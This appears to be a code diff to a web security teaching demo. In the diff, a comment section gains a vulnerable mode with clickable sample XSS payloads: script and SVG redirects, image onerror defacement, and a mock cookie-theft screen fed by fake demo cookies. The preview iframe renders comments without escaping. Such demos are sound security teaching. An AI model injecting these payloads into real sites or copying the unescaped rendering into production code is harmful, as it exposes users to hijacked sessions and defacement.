@@ -1,12 +1,50 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { submitComment, type Comment } from "../lib/api";
 
 interface CommentSectionProps {
   postId: number;
   comments: Comment[];
   isSecure: boolean;
+}
+
+const SAMPLE_PAYLOADS = [
+  {
+    label: "🌐 Domain Redirect",
+    description: "Redirects victim to another site",
+    payload: `<script>window.top.location.href = "https://example.com/hacked"</script>`,
+  },
+  {
+    label: "🍪 Cookie Theft & Defacement",
+    description: "Exposes session cookies and defaces UI",
+    payload: `<script>document.body.innerHTML = '<div style="background:#ff1100;color:white;position:fixed;top:0;left:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:bold;z-index:9999;flex-direction:column;font-family:sans-serif;"><h1>💥 YOU HAVE BEEN HACKED!</h1><p>Sending stolen cookies to attacker server...</p><p style="color:#ffcccc;font-size:14px;">' + INJECTED_COOKIES + '</p></div>';</script>`,
+  },
+  {
+    label: "🖼️ Image onerror Defacement",
+    description: "Bypasses script-tag filters to alter UI",
+    payload: `<img src="x" onerror="document.body.innerHTML='<h1 style=\\'color:red;text-align:center;margin-top:20px;font-family:sans-serif;\\'>XSS via Image onerror!</h1>'; document.body.style.background='black';">`,
+  },
+  {
+    label: "🔺 SVG onload Redirect",
+    description: "Executes via SVG element to redirect",
+    payload: `<svg onload="window.top.location.href='https://example.com/svg-hacked'"></svg>`,
+  },
+];
+
+// Inject fake demo cookies so the cookie-theft payload has something to steal
+function injectDemoCookies() {
+  if (typeof document !== "undefined") {
+    document.cookie = "session_token=abc123xyz_demo; path=/";
+    document.cookie = "user_id=victim_42; path=/";
+  }
+}
+
+function getCookiesString(): string {
+  if (typeof document !== "undefined") {
+    return document.cookie || "session_token=abc123xyz_demo; user_id=victim_42";
+  }
+  return "session_token=abc123xyz_demo; user_id=victim_42";
 }
 
 export default function CommentSection({
@@ -20,6 +58,13 @@ export default function CommentSection({
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [success, setSuccess] = useState(false);
+  const [activePayload, setActivePayload] = useState<string | null>(null);
+  const [cookieString, setCookieString] = useState("session_token=abc123xyz_demo; user_id=victim_42");
+
+  useEffect(() => {
+    injectDemoCookies();
+    setCookieString(getCookiesString());
+  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -37,6 +82,7 @@ export default function CommentSection({
       setComments((prev) => [...prev, result.comment]);
       setName("");
       setComment("");
+      setActivePayload(null);
       setSuccess(true);
       setTimeout(() => setSuccess(false), 3000);
     } catch (err) {
@@ -44,6 +90,11 @@ export default function CommentSection({
     } finally {
       setIsSubmitting(false);
     }
+  };
+
+  const handlePayloadClick = (payload: string, label: string) => {
+    setComment(payload);
+    setActivePayload(label);
   };
 
   const renderCommentContent = (text: string) => {
@@ -55,8 +106,8 @@ export default function CommentSection({
       <div>
         <iframe
           title="Vulnerable raw HTML comment preview"
-          sandbox="allow-scripts allow-modals"
-          srcDoc={buildVulnerableCommentDocument(text)}
+          sandbox="allow-scripts allow-modals allow-top-navigation"
+          srcDoc={buildVulnerableCommentDocument(text, cookieString)}
           className="block h-28 w-full rounded border border-vulnerable/20 bg-white"
         />
         {text.includes("<") && (
@@ -120,7 +171,7 @@ export default function CommentSection({
                     <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                       <polyline points="20 6 9 17 4 12" />
                     </svg>
-                  Auto-escaped
+                    Auto-escaped
                   </span>
                 )}
               </div>
@@ -129,6 +180,42 @@ export default function CommentSection({
           ))
         )}
       </div>
+
+      {/* Sample Payloads — Vulnerable Mode Only */}
+      {!isSecure && (
+        <div className="mb-6 rounded-lg border border-vulnerable/30 bg-vulnerable-light/40 p-5">
+          <div className="flex items-center gap-2 mb-3">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="text-vulnerable">
+              <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
+              <line x1="12" y1="9" x2="12" y2="13" />
+              <line x1="12" y1="17" x2="12.01" y2="17" />
+            </svg>
+            <span className="text-xs font-semibold uppercase tracking-wider text-vulnerable">
+              Try a Sample Attack Payload
+            </span>
+          </div>
+          <p className="text-xs text-on-surface-variant mb-4">
+            Click any payload below to auto-fill the comment field, then submit to see the attack execute in real time.
+          </p>
+          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
+            {SAMPLE_PAYLOADS.map((p) => (
+              <button
+                key={p.label}
+                type="button"
+                onClick={() => handlePayloadClick(p.payload, p.label)}
+                className={`text-left px-4 py-3 rounded-lg border text-sm transition-all
+                  ${activePayload === p.label
+                    ? "border-vulnerable bg-vulnerable/10 text-vulnerable font-semibold"
+                    : "border-vulnerable/30 bg-white hover:border-vulnerable hover:bg-vulnerable/5 text-on-surface"
+                  }`}
+              >
+                <div className="font-semibold mb-0.5">{p.label}</div>
+                <div className="text-xs text-on-surface-variant">{p.description}</div>
+              </button>
+            ))}
+          </div>
+        </div>
+      )}
 
       {/* Comment form */}
       <div className="bg-surface-container rounded-lg p-6 border border-outline-variant">
@@ -163,13 +250,16 @@ export default function CommentSection({
             <textarea
               id="comment-text"
               value={comment}
-              onChange={(e) => setComment(e.target.value)}
+              onChange={(e) => {
+                setComment(e.target.value);
+                setActivePayload(null);
+              }}
               rows={4}
               className="w-full px-4 py-2.5 rounded bg-surface-container-lowest border border-neutral-200 text-on-surface text-sm focus:outline-none focus:border-brand-purple focus:ring-2 focus:ring-brand-purple/20 transition-all resize-y"
               placeholder={
                 isSecure
                   ? "Your comment (output-encoded at render time)"
-                  : "Your comment (try: <script>alert('XSS')</script>)"
+                  : "Your comment (try: <script>document.body.style.background='red'</script>)"
               }
               maxLength={5000}
             />
@@ -218,7 +308,11 @@ export default function CommentSection({
   );
 }
 
-function buildVulnerableCommentDocument(comment: string) {
+function buildVulnerableCommentDocument(comment: string, cookies: string) {
+  // Replace INJECTED_COOKIES placeholder with actual cookie string
+  // so cookie-theft payloads display real data in the alert
+  const injectedComment = comment.replace("INJECTED_COOKIES", JSON.stringify(cookies));
+
   return `<!doctype html>
 <html>
   <head>
@@ -234,6 +328,6 @@ function buildVulnerableCommentDocument(comment: string) {
       }
     </style>
   </head>
-  <body>${comment}</body>
+  <body>${injectedComment}</body>
 </html>`;
 }
